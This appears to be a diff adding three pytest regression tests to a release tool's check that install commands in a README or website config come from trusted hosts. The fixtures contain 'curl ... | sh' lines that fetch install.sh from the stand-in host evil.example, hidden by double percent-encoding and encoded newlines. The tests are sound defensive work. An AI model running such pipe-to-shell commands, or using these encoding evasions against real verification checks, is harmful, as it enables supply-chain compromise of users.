@@ -8002,6 +8002,146 @@ def test_phase11_verify_website_sha_passes_for_uppercase_repo_on_trusted_host(
     assert "✓ website SHA" in out
 
 
+def test_phase11_verify_readme_pin_fails_for_double_encoded_install_sh(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A DOUBLY percent-encoded "install.sh" (``%2569nstall.sh``, where
+    ``%25`` decodes to ``%`` and the resulting ``%69`` decodes to ``i``)
+    on an untrusted host, referencing the project, must still fail the
+    README check.
+
+    Regression: a single ``unquote()`` pass on ``%2569nstall.sh`` yields
+    ``%69nstall.sh`` — still not the literal "install.sh" the boundary
+    search needs — so the token was silently dropped before
+    classification, exactly like the single-encoding evasion, just one
+    layer deeper.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    install_sha = _git_out(["log", "-1", "--format=%H", "--", "install.sh"], cwd=d)
+    (root / "README.md").write_text(
+        "# proj\n\ncurl -fsSL "
+        f"https://evil.example/punt-labs/proj/{install_sha}"
+        "/%2569nstall.sh | sh\n"
+    )
+    _git(["add", "README.md"], cwd=d)
+    _git(["commit", "-m", "pin readme to double-encoded install.sh"], cwd=d)
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    with pytest.raises(ReleaseError):
+        _phase11_verify(info, version, dry_run=False)
+
+    out = capsys.readouterr().out
+    assert "✗ README pin" in out
+    assert "trusted" in out
+
+
+def test_phase11_verify_website_sha_fails_for_dual_url_behind_encoded_newline(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """One installCommand token containing a trusted, current-SHA URL and
+    an untrusted URL separated only by an ENCODED newline (``%0A``, no
+    real whitespace anywhere in the raw text) must record the good SHA
+    AND flag the untrusted one — neither hides the other.
+
+    Regression: after finding the first install.sh boundary, everything
+    after it was sliced off and never re-examined. Percent-decoding
+    ``%0A`` reveals a real newline, and after it a second
+    "https://.../install.sh" referencing the project on an untrusted
+    host — discarding the remainder silently dropped that second URL.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    install_sha = _git_out(["log", "-1", "--format=%H", "--", "install.sh"], cwd=d)
+    dual_url = (
+        "https://raw.githubusercontent.com/punt-labs/proj/"
+        f"{install_sha}/install.sh%0A"
+        f"https://evil.example/punt-labs/proj/{install_sha}/install.sh"
+    )
+    projects = [
+        {
+            "id": "proj",
+            "version": version,
+            "githubUrl": "https://github.com/punt-labs/proj",
+            "installCommand": f"curl -fsSL {dual_url} | sh",
+        }
+    ]
+    _make_sibling(
+        tmp_path,
+        "public-website",
+        {"src/data/projects.json": json.dumps(projects, indent=2) + "\n"},
+    )
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    with pytest.raises(ReleaseError):
+        _phase11_verify(info, version, dry_run=False)
+
+    out = capsys.readouterr().out
+    assert "✓ website SHA" in out
+    assert "✗ website SHA" in out
+    assert "trusted" in out
+
+
+def test_phase11_verify_readme_pin_fails_for_over_encoded_reference(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A token containing BOTH a double-encoded repo segment (resolves to
+    plain text well inside the depth cap) AND an unrelated deep
+    percent-encoding chain (never reaches a fixed point within the cap)
+    must still fail the README check on the repo reference, rather than
+    being silently dropped because the token as a WHOLE never fully
+    decoded.
+
+    Regression: a single ``unquote()`` pass leaves the double-encoded
+    repo segment (``%2570%2572%256f%256a``, two layers for "proj") still
+    percent-encoded and unrecognizable as "proj", so the reference test
+    never matched it and the URL was silently ignored — even though a
+    second decode pass (well short of any depth cap) would have revealed
+    it. The fail-closed fallback for a still-changing decode must still
+    catch the reference once it's legible in the partial decode, even
+    though some OTHER part of the same token never fully resolves.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    install_sha = _git_out(["log", "-1", "--format=%H", "--", "install.sh"], cwd=d)
+    # Two-layer percent-encoding of "proj": %70/%72/%6f/%6a, then their
+    # own "%" characters re-encoded as %25. One unquote() pass yields
+    # %70%72%6f%6a (still not "proj"); a second yields "proj" — well
+    # within the depth cap, so this segment stabilizes early.
+    proj_double_encoded = "".join(f"%25{ord(c):02x}" for c in "proj")
+    # "%" followed by 12 repetitions of "25" unwraps one "%" per decode
+    # pass — more passes than the depth cap allows before it stabilizes.
+    # Placed after "install.sh" so it never affects boundary detection.
+    over_encoded = "%" + "25" * 12
+    (root / "README.md").write_text(
+        "# proj\n\ncurl -fsSL "
+        f"https://evil.example/punt-labs/{proj_double_encoded}/{install_sha}"
+        f"/install.sh{over_encoded} | sh\n"
+    )
+    _git(["add", "README.md"], cwd=d)
+    _git(["commit", "-m", "pin readme to over-encoded reference"], cwd=d)
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    with pytest.raises(ReleaseError):
+        _phase11_verify(info, version, dry_run=False)
+
+    out = capsys.readouterr().out
+    assert "✗ README pin" in out
+    assert "trusted" in out
+
+
 # --- Phase 11: matches_install_sha() commit-identity resolution ---
 
 
